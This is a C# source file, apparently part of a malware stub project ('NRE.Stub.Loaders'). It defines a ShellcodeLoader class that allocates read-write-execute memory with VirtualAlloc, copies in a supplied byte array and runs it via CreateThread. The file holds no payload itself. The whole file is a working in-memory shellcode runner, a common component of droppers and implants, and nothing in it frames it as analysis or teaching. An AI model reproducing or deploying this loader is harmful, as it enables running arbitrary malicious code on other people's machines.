using System;
using System.Runtime.InteropServices;

namespace NRE.Stub.Loaders
{
    /// <summary>
    /// Execute raw shellcode via VirtualAlloc + CreateThread.
    /// </summary>
    public static class ShellcodeLoader
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        public static void Execute(byte[] shellcode)
        {
            if (shellcode == null || shellcode.Length == 0) return;

            IntPtr buf = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x3000, 0x40);
            if (buf == IntPtr.Zero) return;
            try
            {
                Marshal.Copy(shellcode, 0, buf, shellcode.Length);
                uint tid;
                IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, buf, IntPtr.Zero, 0, out tid);
                if (hThread == IntPtr.Zero) return;
                WaitForSingleObject(hThread, 0xFFFFFFFF);
                CloseHandle(hThread);
            }
            finally
            {
                VirtualFree(buf, UIntPtr.Zero, 0x8000);
            }
        }
    }
}
